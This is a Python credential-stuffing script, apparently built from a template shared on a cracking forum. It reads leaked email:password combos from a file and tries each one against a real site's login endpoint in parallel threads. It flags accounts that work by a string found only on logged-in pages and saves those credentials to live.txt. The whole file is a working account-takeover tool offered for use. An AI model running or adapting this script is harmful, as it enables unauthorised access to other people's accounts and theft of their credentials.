import requests
import multiprocessing
from multiprocessing.dummy import Pool
import os
import ctypes

class bcolors:
    Black        = '\033[30m'
    Redd         = "\033[31m"
    Greenn        = "\033[32m"
    Yelloww       = "\033[33m"
    Blue         = "\033[34m"
    Magenta      = "\033[35m"
    Cyan         = "\033[36m"
    LightGray    = "\033[37m"
    DarkGray     = "\033[90m"
    LightRed     = "\033[91m"
    LightGreen   = "\033[92m"
    LightYellow  = "\033[93m"
    LightBlue    = "\033[94m"
    LightMagenta = "\033[95m"
    LightCyan    = "\033[96m"
    White        = "\033[97m"


os.system('cls')


lock = multiprocessing.Lock()


class output (object):
    def screen(self, email, password, case):
        if case==True:
            lock.acquire()
            print(bcolors.Greenn +f"login succes - {email} & {password}")
            print (f"""
                    e = {email}
                    p = {password}
                    """,file=open("live.txt", "a"))
            lock.release()
        elif case==False:
            lock.acquire()
            print(bcolors.Redd + f"login failed sorry ~ I am black {email} & {password}")
            lock.release()



class post (object):
    def proxies(self):
        pass
    def tokens(self):
        pass
    def capture(self):
        pass
    def requ(self, email, password):
        OAuth = requests.session()
        param = {"email": email, #login text for email here
                 "password": password} #login text for password here
        source = OAuth.post ("https://adfoc.us/session/create",data=param).text #URL HERE
        if """<strong>Today's Earnings:</strong>""" in source: #keywords find something on the page that is only there when the acc is valid
            output().screen(email, password, case=True)
        else:
            output().screen(email, password, case=False)



class x (object) :
    def __init__(self):
        self.acc_array = []

    def load(self):
        file = open("combo.txt", "r", encoding="Latin-1").readlines()
        file = [combos.rstrip()for combos in file]
        for lines in file:
            data = lines.split(":")
            self.acc_array.append({"em": data[0],
                                   "pw": data[1]})

    def xs(self, acc):
        email = acc["em"]
        password = acc["pw"]
        while True:
            try:
                post().requ(email, password)
            except Exception:
                pass
    def main(self):
        self.load()
        self.threads = 5
        pool = Pool(self.threads)
        for _ in pool.imap_unordered(self.xs, self.acc_array):
            pass

ctypes.windll.kernel32.SetConsoleTitleW("template by https://cracked.to/ANG  ~HaX0r")

if __name__ == "__main__":
    x().main()
